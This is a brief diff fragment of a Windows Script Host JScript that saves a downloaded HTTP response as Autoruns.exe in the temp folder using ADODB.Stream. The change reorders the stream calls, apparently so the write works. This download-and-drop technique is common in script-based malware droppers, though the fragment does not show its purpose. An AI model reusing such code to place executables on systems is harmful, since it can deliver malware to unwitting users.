@@ -11,10 +11,9 @@ var r = new ActiveXObject('WScript.Shell');
 var appdata = r.ExpandEnvironmentStrings("%temp%");
 Target = appdata + "\\Autoruns.exe"
 var Stream = new ActiveXObject('ADODB.Stream');
-Stream.Open();
 Stream.Type = 1; 
+Stream.Open();
 Stream.Write(Object.ResponseBody);
-Stream.Position = 0;
 var File = new ActiveXObject('Scripting.FileSystemObject');
 if (File.FileExists(Target))
 {
